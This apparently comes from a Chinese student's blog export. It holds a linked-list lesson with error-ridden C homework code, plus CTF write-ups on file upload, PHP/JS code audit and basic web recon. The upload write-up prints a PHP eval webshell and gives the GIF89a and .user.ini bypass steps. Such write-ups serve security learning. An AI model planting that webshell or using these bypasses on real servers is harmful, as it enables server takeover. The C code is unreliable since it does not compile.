class="hljs-title">LinkNode</span> *<span class="hljs-title">next</span>;</span><br>&#125;LinkNode<br></code></pre></td></tr></table></figure><p>在这里LNode是结构体名，LinkNode是新建立的类名。通过使用关键字typedef来定义一个新的类名LinNode来代替struct LNode可以简化代码，让其有更高的可读性。<br>结构体类的指针怎么定义呢直接  类型名 *p; 也就是LinkNode *p；那么如何访问结构体的数据成员呢用-&gt;即可，在该例子中p是结构体的指针，调用结构体中的数据成员data，便可以用p-&gt;data.</p></li><li><p>链表的插入和删除，在单链表中我们需要知道，每个节点都相当于有一个头和有一个尾，而一个节点的尾部就是下一个节点的头部。<img src="http://rs5kgysfr.hn-bkt.clouddn.com/O%25X6YFSOB%40%5D9%25KE8~%7B_SO%7DT.png" srcset="/img/loading.gif" lazyload><br>链表的插入<br>(1)newNode-&gt;next&#x3D;x-&gt;next;<br>(2)x-&gt;next&#x3D;newNode;<br>链表的删除(假设已经把newNode插入了，现在需要将其删除)<br>(1)x-&gt;next&#x3D;x-&gt;next-&gt;next</p></li><li><p>建立单链表<br>建立链表有两种方法分别是，头插法和尾插法<br>(1)头插法<img src="http://rs5kgysfr.hn-bkt.clouddn.com/3E7N%4058S%7DAD%5BO4NFITB%60K8O.png" srcset="/img/loading.gif" lazyload><br>设插入的节点为s，头节点为L，s-&gt;next&#x3D;L-&gt;next;  L-&gt;next&#x3D;s;<br>头插法得到的链表是逆序。<br>(2)尾插法<br><img src="C:\Users\高地舞者\AppData\Roaming\Typora\typora-user-images\image-20230330145553946.png" srcset="/img/loading.gif" lazyload><br>尾插法需要一个尾指针，且该尾指针的位置需要不断更新，设尾指针为L，新插入的节点为s<br>L-&gt;next&#x3D;s; L&#x3D;s;</p></li><li><p>作业<br>1、已知两个递增有序的链表A和B，分别表示两个集合。试设计一个算法，用于求出A与B的交集，并存储在C链表中。例如 : La &#x3D; {2， 4，6，8}；Lb &#x3D; {4，6，8，10}；Lc &#x3D; {4，6，8}。（要求完整程序代码、输入实例和运行结果）。</p><p>2、假设有一个带头结点的单链表L&#x3D;（a1，a2，…，an）。设计一个算法将所有结点逆置，即：L&#x3D;（an，an-1，…，a1）。（要求完整程序代码、输入实例和运行结果）</p><p>1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs c">   <span class="hljs-meta">#inclde <span class="hljs-string">&lt;stdio.h&gt;</span></span><br>   <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br>   <span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ElemType;<br>   <span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LNode</span></span><br><span class="hljs-class">   &#123;</span><br>       ElemType data;<br>       <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LNode</span> *<span class="hljs-title">next</span>;</span>  <span class="hljs-comment">//指向后继结点</span><br>   &#125;LinkNode;               <span class="hljs-comment">//声明单链表结点类型</span><br>   <span class="hljs-type">void</span> <span class="hljs-title function_">CreateListF</span><span class="hljs-params">(LinkNode *&amp;L,ElemType a[],<span class="hljs-type">int</span> n)</span>   <span class="hljs-comment">//头插法建立单链表</span><br>   &#123;<br>       LinkNode *s;<br>       L=(LinkNode *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(LinkNode));    <span class="hljs-comment">//创建头结点</span><br>       L-&gt;next=<span class="hljs-literal">NULL</span>;<br>       <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>       &#123;<br>          s=(LinkNode *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(LinkNode));<span class="hljs-comment">//创建新结点s</span><br>   s-&gt;data=a[i];<br>   s-&gt;next=L-&gt;next;<span class="hljs-comment">//将结点s插在原开始结点之前,头结点之后</span><br>   L-&gt;next=s;<br>       &#125;<br>   &#125;<br>   <span class="hljs-type">void</span> <span class="hljs-title function_">DispList</span><span class="hljs-params">(LinkNode *L)</span> <span class="hljs-comment">//输出线性表</span><br>   &#123;<br>   LinkNode *p=L-&gt;next;<br>   <span class="hljs-keyword">while</span> (p!=<span class="hljs-literal">NULL</span>)<br>   &#123;<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,p-&gt;data);<br>   p=p-&gt;next;<br>   &#125;<br>   <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>   &#123;<br>       LinkNode *L1=<span class="hljs-literal">NULL</span> ,*L2=<span class="hljs-literal">NULL</span>,*L3=<span class="hljs-literal">NULL</span>,*L4=<span class="hljs-literal">NULL</span>,*L5=<span class="hljs-literal">NULL</span>;<br>       <span class="hljs-type">int</span> m,n,j=<span class="hljs-number">0</span>;<br>       <span class="hljs-type">int</span> a[<span class="hljs-number">100</span>]=&#123;<span class="hljs-number">0</span>&#125;,b[<span class="hljs-number">100</span>]=&#123;<span class="hljs-number">0</span>&#125;,c[<span class="hljs-number">100</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;输入数组a需要输入的个数&quot;</span>);<br>       scanf_s(<span class="hljs-string">&quot;%d&quot;</span>,&amp;m);<br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;输入数组a的值&quot;</span>);<br>       <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;m;i++)<br>       &#123;<br>           scanf_s(<span class="hljs-string">&quot;%d&quot;</span>,&amp;a[i]);<br>       &#125;<br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;输入数组b需要输入的个数&quot;</span>);<br>       scanf_s(<span class="hljs-string">&quot;%d&quot;</span>,&amp;n);<br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;输入数组b的值&quot;</span>);<br>       <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>       &#123;<br>           scanf_S(<span class="hljs-string">&quot;%d&quot;</span>,&amp;b[i]);<br>       &#125;<br>   CreateListF(*&amp;L1,a,m);<br>   CreateListF(*&amp;L2,b,n);<br>   *L3=*L1-&gt;next;<br>   *L4=*L2-&gt;next;<br>   <span class="hljs-keyword">while</span>(L3!=<span class="hljs-literal">NULL</span>&amp;&amp;L4!=<span class="hljs-literal">NULL</span>)<br>&#123;<br>       <span class="hljs-keyword">if</span>(*L3-&gt;data==L4-&gt;data)<br>    &#123;<br>           c[j]=L3-&gt;data;<br>           L3=L3-&gt;next;<br>           L4=L4-&gt;next;<br>           j++;<br>       &#125;<br>       <span class="hljs-keyword">if</span>(*L3-&gt;data &gt; *L4-&gt;data)<br>       &#123;<br>           L4=L4-&gt;next;<br>       &#125;<br>       <span class="hljs-keyword">if</span>(L3-&gt;data &lt; L4-&gt;data)<br>       &#123;<br>           L3=L3-&gt;next;<br>       &#125;<br>   &#125;<br>   CreateListF(*&amp;L5,c,j);<br>   DispList(L5);<br>   <br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ElemType;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LNode</span></span><br><span class="hljs-class">&#123;</span><br>    ElemType data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LNode</span> *<span class="hljs-title">next</span>;</span>  <span class="hljs-comment">//指向后继结点</span><br>&#125;LinkNode;               <span class="hljs-comment">//声明单链表结点类型</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">CreateListF</span><span class="hljs-params">(LinkNode *&amp;L,ElemType a[],<span class="hljs-type">int</span> n)</span>   <span class="hljs-comment">//头插法建立单链表</span><br>&#123;<br>    LinkNode *s;<br>    L=(LinkNode *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(LinkNode));    <span class="hljs-comment">//创建头结点</span><br>    L-&gt;next=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>       s=(LinkNode *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(LinkNode));<span class="hljs-comment">//创建新结点s</span><br>s-&gt;data=a[i];<br>s-&gt;next=L-&gt;next;<span class="hljs-comment">//将结点s插在原开始结点之前,头结点之后</span><br>L-&gt;next=s;<br>    &#125;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">DispList</span><span class="hljs-params">(LinkNode *L)</span> <span class="hljs-comment">//输出线性表</span><br>&#123;<br>LinkNode *p=L-&gt;next;<br><span class="hljs-keyword">while</span> (p!=<span class="hljs-literal">NULL</span>)<br>&#123;<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,p-&gt;data);<br>p=p-&gt;next;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    LinkNode *L1=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">int</span> m,j=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> a[<span class="hljs-number">100</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;输入数组a值的个数&quot;</span>);<br>    scanf_s(<span class="hljs-string">&quot;%d&quot;</span>,m);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;输入数组a的值&quot;</span>)<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;m;i++)<br>    &#123;<br>        scanf_s(<span class="hljs-string">&quot;%d&quot;</span>,&amp;a[j]);<br>        j++<br>    &#125;<br>    CreateListF(*&amp;L,a,n);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++)<br>&#123;<br>ListInsert(*&amp;L1, ListLength(L1) + <span class="hljs-number">1</span> - i, L1-&gt;next-&gt;data);<br>ListDelete(*&amp;L1,<span class="hljs-number">1</span>,j);<br>&#125;<br>DispList(L1);<br>&#125;<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    <categories>
      
      <category>数据结构</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件上传1</title>
    <link href="/2023/03/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A01/"/>
    <url>/2023/03/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A01/</url>
    
    <content type="html"><![CDATA[<p>由于某些原因睡不着交，头脑有没有完全清醒，所以现在写一下题解。</p><p><img src="http://rs5kgysfr.hn-bkt.clouddn.com/AJ%24%5DLS%287%7BG9NZMS6BG722%295.png" srcset="/img/loading.gif" lazyload></p><ol><li><p>看到上传点首先简单尝试下<img src="http://rs5kgysfr.hn-bkt.clouddn.com/_%24SA%5BZVAFECV%40%25GQ7%29LQNIL.png" srcset="/img/loading.gif" lazyload><br>先开始尝试文件，上面显示文件类型危险，然后想到了图片上传发现可以.</p><p><img src="http://rs5kgysfr.hn-bkt.clouddn.com/DE5I0%25%60%60M%28T1IR2T71E3SK1.png" srcset="/img/loading.gif" lazyload><br>所以我们试一试图片马上传，首先制作一张图片马进行上传发现不行，这里我简单的尝试了一下，发现假如去掉php的话就上传成功，应该进行了一次内容上的过滤。</p></li><li><p>不过后面发现可以进行短标签绕过，并且后缀名可以改成.php.进行绕过,但是不能访问，所以我们尝试短标签绕过，写入一句话木马<?= eval($_POST['cmd']); ?>发现可以上传，其作用和<?php eval($_POST['cmd'])?>作用一样，当然我们需要在前面加上GIF89a来进行欺骗</p></li><li><p>接下来就要尝试包含该图片的文件了，首先尝试.htaccess文件发现不行，然后查询资料可以找到.user.ini文件可以达到相同的效果，我们在里面写入auto_prepend_file&#x3D;a.jpg,上传成功后寻找上传的地址<img src="http://rs5kgysfr.hn-bkt.clouddn.com/%5BJ%7B4F%5DGCU%25WUE%40GE%29O%5D72%29W.png" srcset="/img/loading.gif" lazyload></p></li><li><p>最后用蚁剑或者菜刀连接即可找到</p><p>这道题整体整理下吧，首先发现常规方法不行，于是上传图片马，使用.user.ini文件包含漏洞，这里还需要使用到GIF89a绕过第二次防护</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>代码审计攻防世界</title>
    <link href="/2023/03/27/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E4%B8%83%E7%89%9B%E4%BA%91/"/>
    <url>/2023/03/27/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E4%B8%83%E7%89%9B%E4%BA%91/</url>
    
    <content type="html"><![CDATA[<ol><li><p>代码审计这一块刚起步不够熟练，将这几天做的代码审计总结一下<br><img src="http://rs5kgysfr.hn-bkt.clouddn.com/S%7D5UHN%294Q%24%40MX_9%28CLAM%29V1.png" srcset="/img/loading.gif" lazyload><br>1.这里会获取两个变量a和b，首先会对a进行判断是否存在，然后获取整数值与6000000作比较，而且长度需要小于或者等于3<br>首先对a进行构造，这里需要想到科学计数法，这里直接写a&#x3D;1e7即为1*10^7</p><p>2.接下来对b进行分析，首先对b进行判断是否存在，这里用到了函数substr(pos,n)和md5()，md5()将b进行加密，substr(md5($b),-6,-6)指将其md5加密值取最后6位这里我们直接构造一个b让其md5为8b184b。<br>（这里需要注意pos-是起始位置且默认为0，n-是截取的长度）</p><p><img src="http://rs5kgysfr.hn-bkt.clouddn.com/%286%5D~M%60%5B772%605WOJ7R%28E22%250.png" srcset="/img/loading.gif" lazyload></p><p>(1)这里就对c进行构造了首先json_decode()将获取到的值进行解码,然后array()函数将其强制转换为数组，并赋值给c，类似于这个例子<br><img src="http://rs5kgysfr.hn-bkt.clouddn.com/Z86%243Y%25L85R%7BI%7B%60~5%7B9%24K2I.png" srcset="/img/loading.gif" lazyload></p><p>在这个例子中，json_decode()函数将JSON字符串解码为一个PHP数组，并将其赋值给$data变量。然后可以使用print_r()函数打印数组的内容。</p><p>(2)接下来判断数组c中的变量m是否为数字，值是否大于2022，这里要求不是数字且值大于2022<img src="http://rs5kgysfr.hn-bkt.clouddn.com/3A873E1882476833C08DAC57963A695C.jpg" srcset="/img/loading.gif" lazyload><br>(3)判断数组c中变量n是否为数组，且该数组中名为n的数组有两个值，第一个值为也为数组这里好构造<br>(4)$d &#x3D; array_search(“DGGJ”, $c[“n”]);<br>   $d &#x3D;&#x3D;&#x3D; false?die(“no…”):NULL;<br>这两个代码让人头痛，首先n中必须有DGGJ，且不能为本身，所以我们应该想办法绕过，这里偷懒借用大佬的图片<br><img src="http://rs5kgysfr.hn-bkt.clouddn.com/%7B4G2A~8EQ%24SV5%60_8%60LW4B7Q.png" srcset="/img/loading.gif" lazyload><br>所以我们需要在数组c中添加0即可<br>最后构造payload?a&#x3D;1e9&amp;b&#x3D;53724&amp;c&#x3D;{“m”:”2023a”,”n”:[[0],0]}</p></li><li><p>终于到了第二个代码审计了（JS），上图！</p><p><img src="http://rs5kgysfr.hn-bkt.clouddn.com/6S~91ZVP%5D6MELW8%285VW~271.png" srcset="/img/loading.gif" lazyload></p><p>一开始看的我头痛，不过还是耐着性子慢慢的看。<br>(1)定义了两个变量pass和tab，pass不必多说，pass_enc是一个需要我们输入的字符串，并且通过split(‘,’)将该字符串隔开并且以数组的形式输出，并且将值赋给tab，同理将pass也变成包含字符串的数组赋值给tab2.<br><img src="http://rs5kgysfr.hn-bkt.clouddn.com/8D%282Q6EET%7D%25W3J~1FVWO%60M0.png" srcset="/img/loading.gif" lazyload></p><p>(2)String.fromCharCode()<br>这里是将字符串转化成unicode对应的编码（Unicode 是一种字符编码标准，它为每个字符分配了一个唯一的数字，称为“码位”（code point）。Unicode 包括了世界上几乎所有的书写系统所使用的字符，可以表示几乎所有语言的文字。）<br>经过一系列的运算最后输出了<br>786OsErtk12<br>FAUX PASSWORD HAHA<br>结果应该是上面第一个值</p></li><li><p>第三个代码审计了，感觉代码审计真的折寿</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>七牛云图床</category>
      
      <category>代码审计</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>easy_web</title>
    <link href="/2023/03/26/easy-web/"/>
    <url>/2023/03/26/easy-web/</url>
    
    <content type="html"><![CDATA[<p>这几天做了很多ctf在这里我总结一下经验</p><ol><li>robots协议<br>Robots协议(也称为爬虫协议，机器人协议)，网络通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些不可以抓取。想查看一个网站的robots协议直接在网址后面加上robots.txt即可<br>我们访问<a href="https://example.com/robots.txt%E5%8D%B3%E5%8F%AF%E7%9C%8B%E5%88%B0f1ag_1s_h3re.php%E6%96%87%E4%BB%B6%EF%BC%8C%E5%B0%86%E8%AF%A5%E8%B7%AF%E5%BE%84%E7%B2%98%E8%B4%B4%E5%88%B0%E7%BD%91%E5%9D%80%E5%90%8E%E9%9D%A2%E5%8D%B3%E5%8F%AF%E5%8F%91%E7%8E%B0flaghttps://example.com/f1ag_1s_h3re.php">https://example.com/robots.txt即可看到f1ag_1s_h3re.php文件，将该路径粘贴到网址后面即可发现flaghttps://example.com/f1ag_1s_h3re.php</a><br><img src="http://rs5kgysfr.hn-bkt.clouddn.com/WUE9SHEL%60NE9%60%29%40%5DD7HG890.png" srcset="/img/loading.gif" lazyload alt="avatar"></li><li>backup文件<br>在网页的修改中，需要对网页文件名进行备份修改。此时就需要对网站整站或者其中某一站或者某一页进行备份，常见备份文件后缀名有.svn  .swp  .svn  .~  .bak  .bash_history，如果给我们一个文件添加前面所给后缀即可看见备份，给我们一个index.php我们添加后缀.bak即可，如index.php.bak。</li><li>Cookie<br>当我们访问网站时，cookie（通常是很小的文本文件，由字母，数字和唯一的ID组成）就会被下载到我们的计算机当中，我们可以将cookie当作钥匙，下次登录网站时不用输入密码即可登入网页。cookie一般都在request当中，所以当有cookie信息时，我们查看请求信息即可<br><img src="http://rs5kgysfr.hn-bkt.clouddn.com/SR%7DME4Z%5B%29C147%252B3HNPD%290.png" srcset="/img/loading.gif" lazyload></li><li>GET和POST请求<br>GET请求放在url当中，所以隐私性较差，请求数据长度是有限的。<a href="http://example.com/%E8%BE%93%E5%85%A5%E9%9C%80%E8%A6%81%E8%BE%93%E5%85%A5%E7%9A%84%E5%86%85%E5%AE%B9%E5%8D%B3%E4%B8%BAget%E8%AF%B7%E6%B1%82">http://example.com/输入需要输入的内容即为get请求</a><br>POST请求没有长度限制，请求数据在body中<br>如以get请求输入a&#x3D;1，以post请求输入b&#x3D;2<br><img src="http://rs5kgysfr.hn-bkt.clouddn.com/A91ECFD1DC54191D8E8A31FCA0A8264F.png" srcset="/img/loading.gif" lazyload alt="avatar"></li><li>xff和referer<br>X-Forwarded-For是一个HTTP扩展头，主要让Web服务器访问用户真实的IP地址<br>Referer作用:如果我在<a href="http://www.sojson.com里面有一个www.baidu.com连接，那么点击这个www.baidu.com,它的header显示的是:Referer=https://www.sojson.com">www.sojson.com里面有一个www.baidu.com连接，那么点击这个www.baidu.com,它的header显示的是:Referer=https://www.sojson.com</a><br>Referer:是HTTP请求header的一部分,比如我只允许我自己的网站访问自己的图片服务器，那么我的域名是<a href="http://www.sojson.com,那么图片服务器每次取到referer来判断一下是不是我自己的域名www.sojson.com,如果是就继续访问,如果不是则拦截./">www.sojson.com，那么图片服务器每次取到Referer来判断一下是不是我自己的域名www.sojson.com，如果是就继续访问，如果不是则拦截。</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
